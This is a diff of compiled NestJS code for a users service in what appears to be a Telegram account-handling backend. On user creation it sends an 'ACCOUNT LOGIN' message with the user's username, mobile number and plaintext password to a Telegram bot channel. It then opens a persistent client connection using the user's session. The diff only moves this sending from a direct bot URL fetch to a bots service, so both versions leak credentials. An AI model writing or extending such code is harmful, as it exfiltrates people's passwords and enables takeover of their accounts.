@@ -18,14 +18,14 @@ const common_1 = require("@nestjs/common");
 const mongoose_1 = require("@nestjs/mongoose");
 const mongoose_2 = require("mongoose");
 const client_service_1 = require("../clients/client.service");
-const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
-const logbots_1 = require("../../utils/logbots");
 const connection_manager_1 = require("../Telegram/utils/connection-manager");
+const bots_1 = require("../bots");
 let UsersService = class UsersService {
-    constructor(userModel, telegramService, clientsService) {
+    constructor(userModel, telegramService, clientsService, botsService) {
         this.userModel = userModel;
         this.telegramService = telegramService;
         this.clientsService = clientsService;
+        this.botsService = botsService;
     }
     async create(user) {
         const activeClientSetup = this.telegramService.getActiveClientSetup();
@@ -36,7 +36,7 @@ let UsersService = class UsersService {
             await this.clientsService.updateClientSession(user.session);
         }
         else {
-            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
+            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`);
             setTimeout(async () => {
                 try {
                     await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
@@ -129,6 +129,7 @@ exports.UsersService = UsersService = __decorate([
     __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
     __metadata("design:paramtypes", [mongoose_2.Model,
         Telegram_service_1.TelegramService,
-        client_service_1.ClientService])
+        client_service_1.ClientService,
+        bots_1.BotsService])
 ], UsersService);
 //# sourceMappingURL=users.service.js.map
